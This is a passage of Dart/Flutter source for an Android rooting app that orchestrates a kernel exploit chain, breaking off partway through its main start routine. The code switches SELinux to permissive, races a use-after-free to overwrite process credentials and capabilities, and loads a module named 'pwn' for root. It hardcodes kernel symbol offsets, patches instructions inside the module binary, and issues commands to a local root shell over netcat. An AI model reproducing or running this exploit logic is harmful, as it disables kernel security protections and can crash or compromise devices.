import 'dart:async';
import 'dart:io' show IOSink;
import 'dart:convert';
import 'dart:io' show File, FileMode, gzip;
import 'dart:typed_data';
import 'dart:math';

import 'package:flutter/foundation.dart';
import 'package:flutter/services.dart' show rootBundle;

import 'version.dart';

import 'calib.dart';
import 'shizuku.dart';

enum StageId { env, permissive, probe, phase1, phase2, root, ksu, verify }

const Map<StageId, String> stageTitles = {
  StageId.env: '环境检查 · 部署资产',
  StageId.permissive: '① SELinux → Permissive',
  StageId.probe: '② 候选进程捕获 cred',
  StageId.phase1: '③ 零写 cap_bset',
  StageId.phase2: '④ 指针写 cap_effective',
  StageId.root: '⑤ 加载模块 → uid=0',
  StageId.ksu: '⑥ 补丁 + 加载 KernelSU',
  StageId.verify: '⑦ su 验证 · 跳转',
};

enum StageStatus { pending, running, ok, failed, skipped }

class StageState {
  final StageId id;
  StageStatus status = StageStatus.pending;
  int tries = 0; // 竞态尝试次数（from stage_done）
  int hits = 0; // 命中次数
  int runs = 0; // 发起轮数
  String detail = '';

  StageState(this.id);

  String get title => stageTitles[id] ?? id.name;
  double get rate => tries == 0 ? 0 : hits / tries;
  bool get hasRate => tries > 0;
}

class RootChain extends ChangeNotifier {
  static const String workDir = '/data/local/tmp/rk';
  final Calibration calib = Calibration();

  /// selinux 零写目标（由校准推出的直映射别名）
  String get selinuxAlias => calib.selinuxAliasHex;

  final List<StageState> stages =
      StageId.values.map((e) => StageState(e)).toList();
  final List<String> logs = [];
  final List<String> suggestions = [];

  bool running = false;

  /// 链路正在跑（任何后台轮询/检查都应据此让路）
  ///
  /// 规则：**一旦开始跑链，就不再在运行期间做任何额外探测/更新检查**
  /// （detectStatus、refreshHealth、更新检查、日志外的网络请求全部让路）。
  /// 原因见 CHANGELOG v1.0.17：3s/5s 的重型轮询会把 UAF 释放的页重新占用，直接推高 panic 率。
  bool get busy => running;
  bool shizukuOk = false;
  bool success = false;        // su 验证通过（整链成功）
  bool softRebootTried = false;
  final Map<String, String> _orig = {};  // 选项改动前的系统原值快照
  bool _optApplied = false;
  String bootId = '';
  String phase = '空闲';
  String? lastError;
  final Map<String, String> health = {}; // temp/wake/mem/posix/cred/enforce
  final Map<StageId, String> skipReason = {};  // 可跳过的阶段 → 原因
  bool alreadyRooted = false;                 // 探测到已越狱（su 可用）
  bool assetsReady = false;                   // 资产已在设备上（跳过重复写入）
  // KernelSU 管理器的三项现场（环境预检就查，别等到 ⑧ 才发现没有 su）
  bool ksuAppInstalled = false;                // APK 装了没（me.weishu.kernelsu）
  bool ksuDirReady = false;                    // /data/adb/ksu 是否已初始化（模块加载后才可能出现）
  String suPath = '';                          // su 实际所在路径（空 = 都没有）
  String ksuAppVersion = '';                   // KernelSU 管理器版本（versionName）
  String lastResetType = '';                   // sys.resettype：上次关机/重启类型（abnormal:AP_S_PANIC 等）
  String devState = '';                        // 一句话设备现状（用于界面）
  Timer? _healthTimer;                        // 5s 主动刷新状态区
  bool _healthBusy = false;                   // 防重入

  // ---- 连点/连跑保护 ----
  // 用户实测：连点"开始"会让设备连续重启，每次 panic 重启都在重新加热；
  // 而且一轮跑完后立刻再点，命中率显著更差。所以：
  //   · 运行中按钮禁用（原有）
  //   · 一轮结束后进入冷却：成功 0s / 失败 90s / 疑似重启 180s
  DateTime? _lastEndAt;
  bool _lastRunFailed = false;
  DateTime? _lastStartAt;
  static const int _coolDownFailSec = 90;
  static const int _coolDownPanicSec = 180;

  /// 还要等多少秒才能再次点「开始」（0 = 可以点）
  int get startCooldownLeft {
    final end = _lastEndAt;
    if (end == null) return 0;
    final need = _lastRunFailed
        ? (_rebootSeenInRun ? _coolDownPanicSec : _coolDownFailSec)
        : 0;
    if (need == 0) return 0;
    final left = need - DateTime.now().difference(end).inSeconds;
    return left > 0 ? left : 0;
  }

  bool get canStart => !running && startCooldownLeft == 0;

  /// 本轮是否检测到过重启（panic）
  bool _rebootSeenInRun = false;
  String shizukuVia = '';

  // ---- 可选项（持久化在 App 私有 SharedPreferences）----
  bool optWifiOff = false;   // 关 WiFi / 蓝牙 / 飞行模式（提高命中率，但会让 Shizuku 无线调试失效）
  bool optTap = true;        // 每轮自动点屏（防止 doze 导致命中率归零）
  bool optStayOn = true;     // 保持屏幕常亮
  bool optCleanup = true;    // 成功后清理已落盘的原生件与临时文件

  Future<void> loadOptions() async {
    final a = await ShizukuShell.getPref('opt.wifiOff');
    final b = await ShizukuShell.getPref('opt.tap');
    final c = await ShizukuShell.getPref('opt.stayOn');
    final d = await ShizukuShell.getPref('opt.cleanup');
    if (a != null) optWifiOff = a == '1';
    if (b != null) optTap = b == '1';
    if (c != null) optStayOn = c == '1';
    if (d != null) optCleanup = d == '1';
    notifyListeners();
  }

  Future<void> setOptions({bool? wifiOff, bool? tap, bool? stayOn, bool? cleanup}) async {
    if (wifiOff != null) {
      optWifiOff = wifiOff;
      await ShizukuShell.setPref('opt.wifiOff', wifiOff ? '1' : '0');
    }
    if (tap != null) {
      optTap = tap;
      await ShizukuShell.setPref('opt.tap', tap ? '1' : '0');
    }
    if (stayOn != null) {
      optStayOn = stayOn;
      await ShizukuShell.setPref('opt.stayOn', stayOn ? '1' : '0');
    }
    if (cleanup != null) {
      optCleanup = cleanup;
      await ShizukuShell.setPref('opt.cleanup', cleanup ? '1' : '0');
    }
    _advice();
    notifyListeners();
  }

  /// 记录被选项影响的系统设置原值（只记第一次，避免把自己改过的值当原值）
  Future<void> _snapshotOptions() async {
    if (_optApplied) return;
    final r = await ShizukuShell.run(
        r'echo T=$(settings get system screen_off_timeout);'
        r'echo S=$(settings get global stay_on_while_plugged_in);'
        r'echo A=$(settings get global airplane_mode_on);'
        r'echo W=$(settings get global wifi_on);'
        r'echo B=$(settings get global bluetooth_on)');
    for (final line in r.out.split('\n')) {
      final i = line.indexOf('=');
      if (i <= 0) continue;
      final k = line.substring(0, i).trim();
      final v = line.substring(i + 1).trim();
      if ('TSAWB'.contains(k) && v.isNotEmpty && v != 'null') _orig[k] = v;
    }
    _optApplied = true;
    String g(String k) => _orig[k] ?? '(未记录)';
    _log('[env] 已记录原设置：屏幕超时=${g('T')} 常亮=${g('S')} '
        '飞行=${g('A')} wifi=${g('W')} bt=${g('B')}');
  }

  /// 把选项改动过的系统设置恢复到运行前的状态
  Future<void> restoreOptions() async {
    if (!_optApplied) return;
    final b = StringBuffer();
    final t = _orig['T'];
    if (optStayOn && t != null && t != 'null') {
      b.write('settings put system screen_off_timeout $t; ');
      final s0 = _orig['S'];
      if (s0 != null) b.write('settings put global stay_on_while_plugged_in $s0; ');
    }
    if (optWifiOff) {
      final a = _orig['A'];
      if (a != null) {
        b.write('settings put global airplane_mode_on $a; ');
        b.write('am broadcast -a android.intent.action.AIRPLANE_MODE --ez state '
            '${a == '1' ? 'true' : 'false'} >/dev/null 2>&1; ');
      }
      final w = _orig['W'];
      if (w != null) b.write('svc wifi ${w == '1' ? 'enable' : 'disable'}; ');
      final bt = _orig['B'];
      if (bt != null) b.write('svc bluetooth ${bt == '1' ? 'enable' : 'disable'}; ');
    }
    if (b.isEmpty) return;
    b.write('true');
    final r = await ShizukuShell.run(b.toString());
    _log('[env] 已恢复原设置（屏幕超时/常亮/飞行/WiFi/蓝牙）rc=${r.code}');
    _optApplied = false;
  }

  /// 开局前按开关拼命令（不再强制关 WiFi）
  String _prepCmd() {
    // 首次应用前先记录原值（异步，不阻塞；快照失败就跳过恢复）
    if (!_optApplied) {
      // ignore: discarded_futures
      _snapshotOptions();
    }
    final b = StringBuffer();
    if (optTap) b.write('input keyevent 224; input tap 540 1200; ');
    if (optStayOn) {
      b.write('svc power stayon true; settings put system screen_off_timeout 1800000; ');
    }
    if (optWifiOff) {
      b.write('svc wifi disable; svc bluetooth disable; settings put global airplane_mode_on 1; '
          'am broadcast -a android.intent.action.AIRPLANE_MODE --ez state true >/dev/null 2>&1; ');
    }
    b.write('true');
    return b.toString();
  }

  Map<StageId, StageState> get _byId => {for (final s in stages) s.id: s};

  bool _stop = false;
  Timer? _heartbeat;

  static const Map<StageId, String> _prefKey = {
    StageId.permissive: 's0',
    StageId.phase1: 'p1',
    StageId.phase2: 'p2',
  };

  // ---------------------------------------------------------------- 日志

  File? _logFile;
  final StringBuffer _pending = StringBuffer();
  Timer? _flushTimer;

  /// 日志同时写盘（App 私有目录），这样设备 panic 重启后还能看到上次运行过程
  Future<void> initLogFile() async {
    final dir = await ShizukuShell.filesDir();
    if (dir.isEmpty) return;
    _logFile = File('$dir/app.log');
    try {
      if (await _logFile!.exists() && await _logFile!.length() > 512 * 1024) {
        await _logFile!.delete();
      }
    } catch (_) {}
  }

  /// 校准弹窗用：走统一日志管道（批量化落盘 + 800 行裁剪）
  void addLogFromCalib(String l) => _log('[calib] $l');

  void _flushLog() {
    final f = _logFile;
    if (f == null || _pending.isEmpty) return;
    final text = _pending.toString();
    _pending.clear();
    try {
      f.writeAsStringSync(text, mode: FileMode.append, flush: false);
    } catch (_) {}
  }

  /// 把缓存刷盘（阶段结束 / App 退到后台时调用）
  void flushLog() {
    _flushTimer?.cancel();
    _flushTimer = null;
    _flushLog();
  }

  /// 读取上次运行的日志（重启后查看用）
  Future<List<String>> loadPrevLog() async {
    if (_logFile == null) await initLogFile();
    final f = _logFile;
    if (f == null) return const [];
    try {
      if (!await f.exists()) return const [];
      final text = await f.readAsString();
      final lines = text.split('\n').where((e) => e.trim().isNotEmpty).toList();
      if (lines.length <= 300) return lines;
      return lines.sublist(lines.length - 300);
    } catch (_) {
      return const [];
    }
  }

  void _log(String s) {
    if (s.isEmpty) return;
    final lines = s.split('\n');
    final buf = StringBuffer();
    for (final l in lines) {
      if (l.trim().isEmpty) continue;
      final t = l.length > 400 ? '${l.substring(0, 400)}…' : l;
      logs.add(t);
      buf.writeln(t);
    }
    if (logs.length > 800) logs.removeRange(0, logs.length - 800);
    final f = _logFile;
    if (f != null && buf.isNotEmpty) {
      _pending.write(buf);
      _flushTimer ??= Timer(const Duration(milliseconds: 250), () {
        _flushTimer = null;
        _flushLog();
      });
    }
    notifyListeners();
  }

  void _stage(StageId id, StageStatus st, {String? detail}) {
    final s = _byId[id]!;
    s.status = st;
    if (detail != null) s.detail = detail;
    notifyListeners();
  }

  /// 环境预检（② 一开始就跑）
  ///
  /// 判据与后果：
  /// - **没装 KernelSU 管理器** ⇒ 直接拦：`su` 由管理器释放到 `/data/adb/ksu/bin`，
  ///   模块加载成功也不会有 su，跑到 ⑧ 必失败（浪费 3–6 分钟）。
  /// - 管理器版本与模板不同 ⇒ 只警告（多数 3.3.x 兼容），但要在日志里看得见。
  /// - `/data/adb/ksu` 不存在 ⇒ 只提示：它要等模块加载后、管理器被打开一次才会被创建。
  Future<void> _preflight() async {
    final r = await ShizukuShell.run(
      'echo APP=\$(pm list packages 2>/dev/null | grep -c me.weishu.kernelsu)'
      '; echo VER=\$(dumpsys package me.weishu.kernelsu 2>/dev/null | sed -n "s/.*versionName=//p" | head -1)'
      '; echo DIR=\$(ls -d /data/adb/ksu 2>/dev/null | head -1)'
      '; echo SU=\$(command -v su 2>/dev/null)'
      '; echo SUM=\$(ls /data/adb/ksu/bin/su 2>/dev/null)');
    final out = r.out;
    ksuAppInstalled = (RegExp(r'^APP=(\d+)', multiLine: true).firstMatch(out)?.group(1) ??
            '0') !=
        '0';
    ksuAppVersion =
        _normVer(RegExp(r'^VER=(\S+)', multiLine: true).firstMatch(out)?.group(1) ?? '');
    ksuDirReady = RegExp(r'^DIR=/', multiLine: true).hasMatch(out);
    suPath = RegExp(r'^SU=(\S+)', multiLine: true).firstMatch(out)?.group(1) ??
        RegExp(r'^SUM=(\S+)', multiLine: true).firstMatch(out)?.group(1) ??
        '';

    final verTxt = ksuAppVersion.isEmpty ? '' : ' v$ksuAppVersion';
    _log('[pre] KernelSU 管理器：'
        '${ksuAppInstalled ? "已安装$verTxt（本模板对应 v$kKsuManagerVersion）" : "未安装（必需）"}');
    _log('[pre] /data/adb/ksu：${ksuDirReady ? "已初始化" : "未初始化（正常：加载模块后本 App 会自己跑 libksud.so install 创建）"}');
    _log('[pre] su：${suPath.isEmpty ? "尚未提供（管理器初始化后才有）" : suPath}');

    // 双包共存检测：.debug 测试包和正式包会装在同一台机器上，各自都有 3s/5s 轮询。
    // 两个 App 同时往竞态窗口里 spawn shell，会明显推高 panic 率（真机踩过）。
    final dual = await ShizukuShell.run(
        'echo D=\$(pm path com.noworld.rootkit 2>/dev/null | head -1 | wc -l)'
        '; echo R=\$(ps -A -o NAME 2>/dev/null | grep -cx "com.noworld.rootkit")'
        '; echo B=\$(ps -A -o NAME 2>/dev/null | grep -cx "com.noworld.rootkit.debug")');
    final dInstalled = (RegExp(r'^D=(\d+)', multiLine: true).firstMatch(dual.out)?.group(1) ??
            '0') !=
        '0';
    final rAlive = int.tryParse(
            RegExp(r'^R=(\d+)', multiLine: true).firstMatch(dual.out)?.group(1) ?? '0') ??
        0;
    final bAlive = int.tryParse(
            RegExp(r'^B=(\d+)', multiLine: true).firstMatch(dual.out)?.group(1) ?? '0') ??
        0;
    if (dInstalled && rAlive > 0 && bAlive > 0) {
      _log('[pre] ⚠ 检测到正式包 com.noworld.rootkit 也在运行（两个 App 都在轮询）'
          '⇒ 会挤占竞态窗口、显著提高 panic 率。建议先执行：'
          'am force-stop com.noworld.rootkit（或临时卸载正式包），再跑本页');
      suggestions.add('正式包还在后台跑：先 `am force-stop com.noworld.rootkit` 或临时卸载它，'
          '否则两个 App 的定时轮询会互相干扰（panic 率明显上升）。');
    }

    if (!ksuAppInstalled) {
      _stage(StageId.env, StageStatus.failed, detail: '未安装 KernelSU 管理器');
      lastError = '未安装 KernelSU 管理器（me.weishu.kernelsu）v$kKsuManagerVersion。'
          'su 由管理器释放，不装它整条链到 ⑧ 必失败：先装 KernelSU v$kKsuManagerVersion '
          '并打开一次，再回到本页点开始。';
      _log('[pre] ✗ 缺少 KernelSU 管理器 ⇒ 停止（否则 ⑧ 一定没有 su）');
      _advice();
      _stop = true;
      return;
    }
    if (ksuAppVersion.isNotEmpty && ksuAppVersion != kKsuManagerVersion) {
      _log('[pre] ⚠ 管理器 v$ksuAppVersion ≠ 模板 v$kKsuManagerVersion：'
          '若 ⑦⑧ 异常，先换回 v$kKsuManagerVersion');
    }
    if (!ksuDirReady) {
      _log('[pre] 提示：su 是管理器在**检测到内核后**释放到 /data/adb/ksu/bin 的；'
          '加载完模块本 App 会自动拉起一次 KernelSU（不需要点它的"安装"——那是解锁后改 boot.img 的流程）');
    }
  }

  // ---------------------------------------------------------------- 诊断（无法 adb 时靠它排障）
  //
  // 全部输出到 App 日志，用户截图就能定位问题。字段前缀统一 `[diag:<阶段>]` / `[diag-root:<阶段>]`。

  /// shell 侧（uid 2000）能看到的现状：SELinux、机型、模块、KSU 管理器与 su 路径
  Future<List<String>> _diag(String tag) async {
    final out = <String>[];
    try {
      final r = await ShizukuShell.run(
        'echo ENF=\$(getenforce 2>/dev/null)'
        '; echo MODEL=\$(getprop ro.product.model)'
        '; echo FP=\$(getprop ro.build.fingerprint)'
        '; echo KREL=\$(uname -r)'
        '; echo MODS=\$(grep -E "^(pwn|kernelsu)" /proc/modules 2>/dev/null | cut -d" " -f1 | tr "\\n" ",")'
        '; echo KSUAPP=\$(pm list packages 2>/dev/null | grep -c me.weishu.kernelsu)'
        '; echo KSUDIR=\$(ls -d /data/adb/ksu 2>/dev/null | head -1)'
        '; echo KSUBIN=\$(ls /data/adb/ksu/bin 2>/dev/null | tr "\\n" ",")'
        '; echo SU_WHICH=\$(command -v su 2>/dev/null)'
        '; echo SU_SYS=\$(ls -l /system/bin/su 2>/dev/null | tr -s " " | cut -d" " -f1,9-)'
        '; echo SU_KSU=\$(ls -l /data/adb/ksu/bin/su 2>/dev/null | tr -s " " | cut -d" " -f1,9-)'
        '; echo SU_RAMDISK=\$(ls -l /debug_ramdisk/su 2>/dev/null | tr -s " " | cut -d" " -f1,9-)'
        '; echo CTX=\$(id -Z 2>/dev/null)');
      for (final line in r.out.split('\n')) {
        final t = line.trim();
        if (t.isNotEmpty) out.add(t);
      }
    } catch (_) {}
    _log('[diag:$tag] ' + out.join(' | '));
    return out;
  }

  /// root 侧（走 5556 自己的 root shell）才能看到的：内核符号、dmesg、KSU 目录权限
  ///
  /// 顺带核对「内核镜像是否与本机标定的一致」：用 5 个符号相对 _stext 的偏移和本机镜像比对。
  /// 不符 ⇒ 这台机器的内核和已知镜像不同，后面的地址全都不可信（最该报给作者的信息）。
  Future<void> _diagRoot(String tag) async {
    const expect = <String, int>{
      'selinux_state': 0x27D7A60,
      'init_task': 0x254DAC0,
      'commit_creds': 0x2DCB48,
      'prepare_kernel_cred': 0x4798B4,
      'init_cred': 0x2563880,
    };
    try {
      final cmd = 'echo ID=\$(id -u)'
          '; echo CTX=\$(id -Z 2>/dev/null)'
          '; echo KPTR=\$(cat /proc/sys/kernel/kptr_restrict 2>/dev/null)'
          '; echo SU=\$(command -v su 2>/dev/null)'
          '; echo KSUBIN=\$(ls /data/adb/ksu/bin 2>/dev/null | tr "\\n" ",")'
          '; echo DMESG_TAIL=\$(dmesg 2>&1 | tail -1 | cut -c1-80)'
          '; grep -E " (_stext|selinux_state|init_task|commit_creds|prepare_kernel_cred|init_cred)\$"'
          ' /proc/kallsyms 2>/dev/null | head -8'
          '; echo ---DMESG-KSU---'
          '; dmesg 2>/dev/null | grep -iE "ksu|kernelsu" | tail -10';
      final r = await ShizukuShell.run('echo ${_shq(cmd)} | nc 127.0.0.1 5556 2>&1');
      final txt = r.out.trim();
      if (txt.isNotEmpty) {
        _log('[diag-root:$tag]');
        for (final l in txt.split('\n')) {
          if (l.trim().isNotEmpty) _log('  $l');
        }
      }
      // 解析符号表，算相对 _stext 的偏移
      BigInt? stext;
      final got = <String, BigInt>{};
      for (final l in txt.split('\n')) {
        final m = RegExp(r'^([0-9a-f]{8,16})\s+\S\s+(\w+)').firstMatch(l.trim());
        if (m == null) continue;
        final addr = BigInt.tryParse(m.group(1)!, radix: 16);
        if (addr == null) continue;
        final name = m.group(2)!;
        if (name == '_stext') {
          stext = addr;
        } else if (expect.containsKey(name)) {
          got[name] = addr;
        }
      }
      if (stext == null || got.isEmpty) {
        _log('[diag-root:$tag] 内核符号不可读（kptr_restrict 或 SELinux 拦截）⇒ 无法核对镜像');
        return;
      }
      final bad = <String>[];
      for (final e in expect.entries) {
        final a = got[e.key];
        if (a == null) {
          bad.add('${e.key}=缺失');
          continue;
        }
        final off = a - stext;
        final ok = off == BigInt.from(e.value);
        if (!ok) {
          bad.add('${e.key}=0x${off.toUnsigned(64).toRadixString(16)}'
              '(期望0x${e.value.toRadixString(16)})');
        }
      }
      if (bad.isEmpty) {
        _log('[diag-root:$tag] 内核镜像核对：5/5 符号偏移一致 ⇒ 与内置标定同一镜像');
      } else {
        _log('[diag-root:$tag] 内核镜像核对：不一致 ⇐ ${bad.join(', ')}'
            '（这台机器的内核与本机标定不同，需重新标定）');
      }
    } catch (e) {
      _log('[diag-root:$tag] 采集失败：$e');
    }
  }

  @override
  void dispose() {
    stopHealthPolling();
    _flushTimer?.cancel();
    super.dispose();
  }

  void _advice() {
    suggestions.clear();
    final env = _byId[StageId.env]!;
    final perm = _byId[StageId.permissive]!;
    final p1 = _byId[StageId.phase1]!;
    final p2 = _byId[StageId.phase2]!;
    final ksu = _byId[StageId.ksu]!;

    if (alreadyRooted) {
      suggestions.add('设备已越狱：可直接点「KernelSU」打开管理面板；如需撤销，右上角「重启」正常重启即可。');
      return;
    }
    if (!shizukuOk) {
      suggestions.add('先授权 Shizuku（打开 Shizuku → 无线调试启动 → 回到本页点「授权」）。');
    }
    if (perm.status == StageStatus.failed) {
      suggestions.add('permissive 连续未命中：确认屏幕常亮、关 WiFi / 开飞行模式、机身不烫（>60°C 会降频）。');
    } else if (perm.hasRate && perm.rate < 0.4) {
      suggestions.add('permissive 命中率 ${(perm.rate * 100).toStringAsFixed(0)}% 偏低：每轮前会点屏，建议重启设备后再跑。');
    }
    if (p1.status == StageStatus.failed || p2.status == StageStatus.failed) {
      suggestions.add('cred 写未落地：命中率会随尝试次数下降，重启设备后重跑通常更稳（本页可继续点开始）。');
    }
    if (ksu.status == StageStatus.failed) {
      suggestions.add('KSU 加载失败：看日志里 ksupatch / ml2 的报错；模板与内核版本必须匹配。');
    } else if (ksu.status == StageStatus.ok && _byId[StageId.verify]!.status == StageStatus.failed) {
      suggestions.add('KernelSU 模块已在跑，但 su 不存在 —— su 由 KernelSU 管理器（App）释放到 '
          '/data/adb/ksu/bin：打开 KernelSU，顶部若显示"未安装/点击安装"就按提示装一次，'
          '再回到本页点开始（①–⑥ 会跳过）；日志里 [diag:ksu] / [diag-root:ksu] 有完整现场。');
    }
    if (env.status == StageStatus.failed) {
      suggestions.add('资产部署失败：确认 Shizuku 在线、/data/local/tmp 可写。');
    }
    final t = int.tryParse(health['T'] ?? '');
    if (t != null && t > 45000) {
      suggestions.add('机身偏热（${(t / 1000).toStringAsFixed(1)}°C）：CPU 会降频、命中率明显下降，建议停一会儿降温。');
    }
    if ((health['W'] ?? '').isNotEmpty && health['W'] != 'Awake') {
      suggestions.add('屏幕不在唤醒状态（${health['W']}）：命中和 rnd 会掉，App 每轮会自动点屏。');
    }
    if (health['E'] == 'Permissive') {
      suggestions.add('当前是 Permissive：SELinux context 已被打坏，'
          '若中断请点右上角「重启」做正常重启（比 panic 重启黑屏时间短）。');
    }
    if (optWifiOff) {
      suggestions.add('已开启「关 WiFi/蓝牙」：命中率更高，但重启后要重新打开 WiFi、'
          '重新开启开发者选项里的「无线调试」才能启动 Shizuku（或用电脑 adb 启动）。');
    }
    if (suggestions.isEmpty) {
      suggestions.add(running ? '正在执行，保持屏幕常亮；单轮约 3–5 分钟。' : '点「开始越狱」：先拿 root，再自动装 KernelSU。');
    }
    notifyListeners();
  }

  // ---------------------------------------------------------------- 小工具

  int _seq = 0;
  String _ts() {
    final d = DateTime.now();
    _seq = (_seq + 1) % 10000;
    return '${d.hour.toString().padLeft(2, '0')}${d.minute.toString().padLeft(2, '0')}'
        '${d.second.toString().padLeft(2, '0')}_${d.millisecond.toString().padLeft(3, '0')}'
        '$_seq';
  }

  static final BigInt _u64 = BigInt.one << 64;

  /// 内核地址一律用 BigInt：0xffff... 超过 int64 上限，用 int 会 FormatException
  String _hex(BigInt v) =>
      '0x${(v & (_u64 - BigInt.one)).toRadixString(16)}';

  BigInt _fromHex(String s) {
    final t = s.startsWith('0x') || s.startsWith('0X') ? s.substring(2) : s;
    return BigInt.parse(t, radix: 16);
  }

  static String _shq(String s) => "'${s.replaceAll("'", "'\\''")}'";

  /// 把 px2_mod.c 里"恢复 selinux.initialized"用的 4 条 movz/movk 常量，
  /// 按校准得到的别名就地重写（原始常量 = 本机型默认别名）。
  Uint8List _patchModuleAlias(Uint8List src, String aliasHex) {
    // 内核地址超出 int64 上限，必须用 BigInt（否则 FormatException）
    final wantBig = BigInt.parse(aliasHex.substring(2), radix: 16) | BigInt.one;
    // 原始编译常量（pwn_mod.c 里 movz/movk 拼出的值）
    final origBig = BigInt.parse('ffffff8049fe7a61', radix: 16);
    if (wantBig == origBig) return src;
    // 后续按 16 位分片编码，用 BigInt 取位，避免任何 int 溢出
    int part(BigInt v, int shift) =>
        ((v >> shift) & BigInt.from(0xffff)).toInt();

    int movz(int imm, int rd) => 0xD2800000 | ((imm & 0xffff) << 5) | rd;
    int movk(int imm, int hw, int rd) =>
        0xF2800000 | ((hw & 3) << 21) | ((imm & 0xffff) << 5) | rd;

    List<int> enc(BigInt v) {
      final b = BytesBuilder();
      void put(int w) {
        b.add([w & 0xff, (w >> 8) & 0xff, (w >> 16) & 0xff, (w >> 24) & 0xff]);
      }
      put(movz(part(v, 0), 3));
      put(movk(part(v, 16), 1, 3));
      put(movk(part(v, 32), 2, 3));
      put(movk(part(v, 48), 3, 3));
      return b.toBytes();
    }

    final from = enc(origBig);
    final to = enc(wantBig);
    final out = Uint8List.fromList(src);
    var patched = 0;
    for (var i = 0; i + 16 <= out.length; i++) {
      var hit = true;
      for (var j = 0; j < 16; j++) {
        if (out[i + j] != from[j]) {
          hit = false;
          break;
        }
      }
      if (hit) {
        for (var j = 0; j < 16; j++) {
          out[i + j] = to[j];
        }
        patched++;
      }
    }
    _log('[env] module.ko 别名改写：${from.length}B 指令块 ×$patched → ${aliasHex}');
    return out;
  }

  /// 模块名唯一化：把 .modinfo / __this_module.name 里的 "pwn4" 换成 "pwnX"
  /// 这样同一个 boot 里重复跑也能再加载一次（不同名）
  Uint8List _uniqueModuleName(Uint8List src) {
    const from = 'pwn4';
    final rnd = 'abcdefghijklmnopqrstuvwxyz0123456789'[Random().nextInt(36)];
    final to = 'pwn$rnd';
    final out = Uint8List.fromList(src);
    for (var i = 0; i + from.length <= out.length; i++) {
      var ok = true;
      for (var j = 0; j < from.length; j++) {
        if (out[i + j] != from.codeUnitAt(j)) {
          ok = false;
          break;
        }
      }
      if (ok) {
        for (var j = 0; j < to.length; j++) {
          out[i + j] = to.codeUnitAt(j);
        }
      }
    }
    return out;
  }

  Future<String> _bootId() async {
    final r = await ShizukuShell.run('cat /proc/sys/kernel/random/boot_id 2>&1');
    if (r.out.trim().isEmpty) _log('[env] boot_id 读取异常: rc=${r.code} ${r.all}');
    return r.out.trim();
  }

  Future<void> _sleep(int ms) async {
    final end = DateTime.now().add(Duration(milliseconds: ms));
    while (!_stop && DateTime.now().isBefore(end)) {
      await Future.delayed(const Duration(milliseconds: 200));
    }
  }

  /// 解析 exploit 日志里的 stage_done 行：统计 try/hit
  /// 统计 stage_done；st==0 归 permissive，st==1 归调用方指定的阶段（③ 或 ④）
  void _countTries(String logText, {StageId phase1OrPhase2 = StageId.phase1}) {
    final re = RegExp(r'stage_done st=(\d) try=(\d+) leak=(0x[0-9a-fA-F]+|0)');
    for (final m in re.allMatches(logText)) {
      final st = int.parse(m.group(1)!);
      final leak = m.group(3)!;
      final id = st == 0 ? StageId.permissive : phase1OrPhase2;
      final s = _byId[id]!;
      s.tries += 1;
      if (leak != '0') s.hits += 1;
    }
  }

  List<BigInt> _parseCreds(String probeLog) {
    final re = RegExp(r'CAND idx=\d+ pid=\d+ CRED=(0x[0-9a-fA-F]+) bit16=(\d)');
    final out = <BigInt>[];
    for (final m in re.allMatches(probeLog)) {
      final v = _fromHex(m.group(1)!);
      final b16 = int.parse(m.group(2)!);
      // bit16=1 优先，放前面
      if (b16 == 1) {
        out.insert(0, v);
      } else {
        out.add(v);
      }
    }
    return out;
  }

  // ---------------------------------------------------------------- 主流程

  Future<void> start() async {
    if (running) return;
    if (startCooldownLeft > 0) {
      _log('[start] 冷却中（还需 ${startCooldownLeft}s）：连点/连跑只会让设备反复重启升温');
      return;
    }
    _lastStartAt = DateTime.now();
    _rebootSeenInRun = false;
    running = true;
    _stop = false;
    lastError = null;
    for (final s in stages) {
      s.status = StageStatus.pending;
      s.detail = '';
    }
    logs.clear();
    success = false;
    await initLogFile();
    // 校准在「环境检查」完成资产部署之后执行（见 _runEnv 末尾），届时 koquery/BTF 已就位    _log('===== 新会话 ${DateTime.now().toString().substring(0, 19)} =====');
    _loadStats();
    _advice();
    notifyListeners();

    // 心跳：更新耗时/保持屏幕
    _heartbeat = Timer.periodic(const Duration(seconds: 20), (_) async {
      if (!running) return;
      await ShizukuShell.run(_prepCmd());
      await refreshHealth(force: true);
    });

    try {
      bootId = await _bootId();
      await _snapshotOptions();   // 先记录原值，运行结束/成功后可原样恢复
      await refreshHealth(force: true);
      // 探测现状（决定哪些阶段可直接跳过）
      try {
        await detectStatus();
      } catch (e) {
        _log('[status] 探测失败：$e');
      }
      for (final e in skipReason.entries) {
        _stage(e.key, StageStatus.skipped, detail: e.value);
      }
      if (alreadyRooted) {
        success = true;
        phase = '已越狱成功（无需操作）';
        _log('[verify] su 已可用：设备已越狱，本次不执行任何步骤');
        notifyListeners();
        return;   // finally 仍会收尾
      }

      Future<void> guarded(StageId id, Future<void> Function() fn,
          {required StageId next}) async {
        if (_stop || _byId[id]!.status == StageStatus.failed) return;
        if (_byId[id]!.status == StageStatus.skipped) {
          _log('[${id.name}] 跳过：${skipReason[id] ?? "已满足"}');
          return;
        }
        try {
          await fn();
        } catch (e) {
          _log('[${id.name}] 异常: $e');
          _stage(id, StageStatus.failed, detail: '$e');
          lastError = '$e';
        }
        // 函数正常返回但没置 ok/ failed（例如中途 _stop）⇒ 不能静默停在 pending
        if (!_stop && _byId[id]!.status == StageStatus.pending) {
          _stage(id, StageStatus.failed, detail: '未完成');
          lastError = '${_byId[id]!.title} 未完成';
        }
      }

      await guarded(StageId.env, _runEnv, next: StageId.permissive);
      if (!_stop && statusOkOrSkipped(StageId.env)) {
        await guarded(StageId.permissive, _runPermissive,
            next: StageId.probe);
      }
      if (!_stop && (statusOkOrSkipped(StageId.permissive))) {
        await guarded(StageId.probe, _runProbe, next: StageId.phase1);
      }
      if (!_stop && (statusOkOrSkipped(StageId.probe))) {
        await guarded(StageId.phase1, _runPhase1, next: StageId.phase2);
      }
      if (!_stop && (statusOkOrSkipped(StageId.phase1))) {
        await guarded(StageId.phase2, _runPhase2, next: StageId.root);
      }
      if (!_stop && (statusOkOrSkipped(StageId.phase2))) {
        await guarded(StageId.root, _runRoot, next: StageId.ksu);
      }
      if (!_stop && (statusOkOrSkipped(StageId.root))) {
        await guarded(StageId.ksu, _runKsu, next: StageId.verify);
      }
      if (!_stop && (statusOkOrSkipped(StageId.ksu))) {
        await guarded(StageId.verify, _runVerify, next: StageId.verify);
      }
    } catch (e, st) {
      lastError = '$e';
      _log('EXCEPTION: $e');
      _log('$st');
    } finally {
      _heartbeat?.cancel();
      _heartbeat = null;
      if (success) {
        phase = '越狱成功';
      } else if (_stop) {
